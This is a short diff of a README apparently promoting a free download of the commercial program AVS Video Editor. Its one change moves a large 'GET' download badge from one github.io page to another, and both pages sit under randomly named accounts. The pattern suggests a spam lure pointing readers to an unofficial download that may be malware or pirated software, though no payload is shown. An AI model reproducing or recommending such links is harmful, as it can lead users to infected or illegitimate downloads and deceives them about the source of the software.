@@ -1,6 +1,6 @@
 # Avs Video Editor Software - PC Video Editing Software for Windows
 
-[![GET Avs Video Editor Download](https://img.shields.io/badge/GET%20%E2%80%94%20Avs%20Video%20Editor%20Download-0078D6?style=for-the-badge&logoColor=white)](https://benmacdonaldkrzq.github.io/.github/avs-video-editor)
+[![GET Avs Video Editor Download](https://img.shields.io/badge/GET%20%E2%80%94%20Avs%20Video%20Editor%20Download-0078D6?style=for-the-badge&logoColor=white)](https://coltmcclurefklz.github.io/.github/avs-video-editor)
 
 ## What Avs Video Editor Download Provides
 
